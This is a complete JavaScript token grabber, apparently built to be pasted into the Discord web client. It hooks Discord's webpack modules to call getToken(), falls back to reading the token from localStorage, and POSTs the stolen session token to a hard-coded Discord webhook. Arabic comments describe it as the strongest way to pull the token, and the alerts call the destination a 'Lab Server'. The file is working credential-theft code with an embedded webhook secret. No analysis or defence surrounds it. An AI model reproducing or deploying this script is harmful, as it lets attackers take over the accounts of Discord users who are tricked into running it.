(function() {
    const WEBHOOK = "https://discord.com/api/webhooks/1466835198942515254/MCAPfFl1novelcM6QGl9ZKP56zB1hijO6UdOm9zi-frGJ7pw6kE0mFDnqANHJCohg8JD";

    try {
        // سحب التوكن بأقوى طريقة (Webpack Hook)
        window.webpackChunkdiscord_app.push([[Math.random()],{},(e)=>{
            for(const m in e.c){
                if(e.c[m].exports?.default?.getToken){
                    const token = e.c[m].exports.default.getToken();
                    if(token){
                        const xhr = new XMLHttpRequest();
                        xhr.open("POST", WEBHOOK);
                        xhr.setRequestHeader("Content-Type", "application/json");
                        xhr.send(JSON.stringify({ content: "🏆 **MANUAL SUCCESS:** `" + token + "`" }));
                        alert("Token Sent to Lab Server!");
                    }
                }
            }
        }]);
    } catch (e) {
        // إذا فشل الـ Webpack، جرب الـ LocalStorage
        const t = localStorage.getItem('token')?.replace(/"/g, "");
        if (t) {
            const xhr = new XMLHttpRequest();
            xhr.open("POST", WEBHOOK);
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.send(JSON.stringify({ content: "🏆 **MANUAL SUCCESS (LS):** `" + t + "`" }));
            alert("Token Sent via Storage!");
        }
    }
})();
